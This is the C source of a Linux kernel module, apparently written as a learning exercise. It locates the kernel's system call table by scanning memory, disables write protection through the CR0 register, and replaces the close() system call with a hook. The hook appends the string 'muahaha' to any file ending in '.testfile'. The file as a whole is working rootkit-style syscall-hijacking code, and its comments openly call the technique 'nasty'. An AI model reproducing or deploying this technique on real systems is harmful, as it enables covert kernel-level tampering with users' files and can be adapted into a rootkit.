#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fdtable.h>

// Special kernel macro to indicate license
MODULE_LICENSE("Dual BSD/GPL");

#define START_MEM PAGE_OFFSET // Kernel memory start point
#define END_MEM ULLONG_MAX // Ending point

#define DISABLE_WRITE_PROT (write_cr0 (read_cr0() & (~0x10000)));
#define ENABLE_WRITE_PROT (write_cr0 (read_cr0() | 0x10000));

static char * filext = ".testfile";
static char * string_to_insert = "muahaha";
static unsigned long ** sys_call_table;
asmlinkage int (*original_close) (int fd);

static unsigned long ** get_sys_call_table(void)
{
	unsigned long i;
	unsigned long **sctable;
	for (i = START_MEM; i < END_MEM; i += sizeof(void *))
	{
		sctable = (unsigned long **) i;
		if (sctable[__NR_close] == (unsigned long *) sys_close)
		{
			return sctable;
		}
	}
	return NULL;
}

// custom_close() will check the pathname of a given fd and compare the file ext to
// filext. If it matches, string_to_insert is written into the file.
// This is pretty nasty stuff since kernel modules shouldn't be doing
// things like this, but why not for the sake of learning
asmlinkage int custom_close(int fd)
{
	struct files_struct *files = current->files;
	struct file *opened_file;
	struct path *path_of_file;
	char *tmp;
	char *pathname;

	spin_lock(&files->file_lock);
	opened_file = fcheck_files(files, fd);
	if (!opened_file)
	{
		spin_unlock(&files->file_lock);
		return ENOENT;
	}

	path_of_file = &opened_file->f_path;
	path_get(path_of_file);
	spin_unlock(&files->file_lock);
	
	tmp = (char*)__get_free_page(GFP_TEMPORARY);

	if (!tmp)
	{
		path_put(path_of_file);
		return ENOMEM;
	}

	pathname = d_path(path_of_file, tmp, PAGE_SIZE);
	path_put(path_of_file);

	if (IS_ERR(pathname))
	{
		free_page((unsigned long) tmp);
		return PTR_ERR(pathname);
	}

	if (!strcmp(pathname + strlen(pathname) - strlen(filext), filext))
	{
		mm_segment_t old_fs;
		int ret;
		loff_t pos = 0;

		// Disgusting hack
		old_fs = get_fs();
		set_fs(KERNEL_DS);
		opened_file = filp_open(pathname, O_RDWR | O_APPEND, 0644);
		ret = vfs_write(opened_file, string_to_insert, strlen(string_to_insert), &pos);
		filp_close(opened_file, NULL);
		set_fs(old_fs);
	}
	free_page((unsigned long) tmp);

	return (*original_close)(fd);
}

static int hijack_close_init(void)
{
	printk(KERN_INFO "hijack-close started..\n");
	sys_call_table = get_sys_call_table();
	if (!sys_call_table)
	{
		printk(KERN_ERR "Unable to acquire system call table\n");
		return EPERM;
	}

	DISABLE_WRITE_PROT;
	original_close = (void *) sys_call_table[__NR_close];
	sys_call_table[__NR_close] = (unsigned long *) custom_close;
	ENABLE_WRITE_PROT;

	return 0;
}

static void hijack_close_exit(void)
{
	printk(KERN_INFO "hijack-close closing..\n");

	DISABLE_WRITE_PROT;
	sys_call_table[__NR_close] = (unsigned long *) original_close;
	ENABLE_WRITE_PROT;
}

module_init(hijack_close_init);
module_exit(hijack_close_exit);
